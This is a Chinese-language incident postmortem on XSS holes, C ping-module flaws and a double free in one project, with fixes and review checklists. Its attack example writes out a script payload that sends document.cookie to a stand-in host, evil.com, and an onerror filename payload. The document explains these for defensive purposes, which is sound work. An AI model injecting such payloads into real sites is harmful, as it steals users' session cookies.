# Postmortem: 安全漏洞问题

**严重程度**: 🔴 P0 - 关键
**发现时间**: 2026-03-02
**修复提交**: `8fec332`, `0ff4e52`, `b8a6f09`
**影响组件**: Web 前端, Agent C 代码

---

## 问题概述

项目中存在多处安全漏洞，包括 XSS 攻击面和内存安全问题。

---

## 1. XSS 安全漏洞

### 根因分析

前端代码在多处直接将用户输入/服务器数据插入 DOM，未进行 HTML 转义：

| 位置 | 问题 | 风险 |
|------|------|------|
| `utils.js` | Toast 消息未转义 | 恶意消息可执行脚本 |
| `app.js` | 进程搜索关键词未转义 | 搜索框注入 |
| `app.js` | 进程名称显示未转义 | 进程名伪造攻击 |
| 文件树/编辑器 | 文件名/路径未转义 | 恶意文件名注入 |
| Ping 结果 | IP 地址未转义 | 网络数据注入 |

### 攻击向量示例

```javascript
// 恶意进程名
process.name = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

// 恶意文件名
filename = "<img src=x onerror=alert('XSS')>.txt"
```

### 修复方案

```javascript
// utils.js - 添加通用转义函数
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 使用示例
element.innerHTML = escapeHtml(processName);
element.textContent = unescapedData; // 或直接使用 textContent
```

### 教训

1. **永不信任外部数据** - 任何来自服务器/用户的数据都必须转义
2. **优先使用 textContent** - 除非确实需要 HTML，否则用 textContent 而非 innerHTML
3. **安全审计工具** - 考虑集成 DOM-based XSS 检测工具

---

## 2. Ping 模块安全问题

### 根因分析

C 语言 Ping 实现（`agent_ping.c`）存在多处安全缺陷：

| 问题 | 代码位置 | 后果 |
|------|----------|------|
| 校验和溢出未保护 | checksum 计算 | 潜在缓冲区溢出 |
| 时间戳精度不足 | 使用 float | 精度丢失 |
| IP 地址未验证 | 响应处理 | IP 欺骗攻击 |
| TTL 未验证 | 响应解析 | 无效数据接收 |

### 修复方案

```c
// 校验和溢出保护
if (len < ip_hdr_len) {
    log_error("Invalid packet length");
    return -1;
}

// 时间戳精度提升
double timestamp = (double)tv.tv_sec + (double)tv.tv_usec / 1000000.0;

// IP 地址验证
if (memcmp(icmp_hdr + 8, &target_addr, 4) != 0) {
    log_debug("IP mismatch, ignoring");
    continue;
}

// TTL 验证
if (ip_hdr->ttl == 0 || ip_hdr->ttl > 255) {
    log_debug("Invalid TTL");
    continue;
}
```

### 教训

1. **C 语言防御性编程** - 所有外部输入都要验证长度、范围、有效性
2. **静态分析工具** - 使用 cppcheck/splint 定期扫描
3. **类型精度** - 网络协议使用 double 或更高精度计时

---

## 3. 内存安全问题

### 根因分析

`agent_update.c` 存在 double free 漏洞：

```c
// 错误代码
free(current_binary);
// ... 后续代码可能再次访问 current_binary
if (current_binary) {  // 检查失败，因为指针未置空
    free(current_binary);  // double free!
}
```

### 修复方案

```c
// 正确做法
free(current_binary);
current_binary = NULL;  // 立即置空
```

### 教训

1. **free 后立即置空** - 防止 use-after-free 和 double-free
2. **静态分析** - cppcheck 可检测此类问题
3. **防御性释放** - 考虑使用宏 `SAFE_FREE(ptr)` 自动置空

---

## 预防措施

### 立即实施

1. **前端 XSS 扫描** - 集成到 CI/CD 流程
2. **C 代码静态分析** - 添加 cppcheck 到 pre-commit hook
3. **安全代码审查** - 所有涉及用户输入的代码变更需安全审查

### 长期改进

1. **安全培训** - 开发者安全教育
2. **渗透测试** - 定期第三方安全审计
3. **依赖扫描** - 监控第三方库漏洞

---

## 检测模式

在代码审查时，警惕以下模式：

```javascript
// 🚨 危险模式
element.innerHTML = userInput;
$element.html(serverData);

// ✅ 安全替代
element.textContent = userInput;
element.innerText = serverData;
$element.text(serverData);
```

```c
// 🚨 危险模式
free(ptr);
// ... 其他代码
free(ptr);  // double free!

// ✅ 安全替代
free(ptr);
ptr = NULL;
```

---

## 相关提交

- `8fec332` - XSS 漏洞修复
- `0ff4e52` - Ping 安全修复
- `b8a6f09` - Double free 修复